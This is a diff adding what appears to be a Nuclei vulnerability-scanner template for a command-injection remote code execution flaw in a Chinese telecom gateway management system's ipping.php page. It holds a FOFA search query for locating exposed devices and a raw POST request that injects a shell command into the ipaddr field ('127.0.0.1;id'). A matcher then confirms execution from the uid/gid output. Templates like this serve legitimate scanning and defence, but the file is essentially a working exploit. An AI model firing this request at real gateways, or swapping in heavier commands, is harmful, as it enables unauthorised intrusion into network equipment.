@@ -1,0 +1,39 @@
+id: dx-gateway-ipping-rce
+
+info:
+  name: 电信网关配置管理系统 ipping.php - Remote Code Execution
+  author: qwtd
+  severity: critical
+  metadata:
+    max-request: 2
+    fofa-query: body="a:link{text-decoration:none;color:orange;}"
+  tags: 电信网关配置管理系统
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /manager/ipping.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 19
+        Connection: close
+        Cookie: PHPSESSID=pof41mogacm6v38ltsni5t6962
+        Upgrade-Insecure-Requests: 1
+
+        ipaddr=127.0.0.1;id
+
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+      - type: status
+        status:
+          - 200
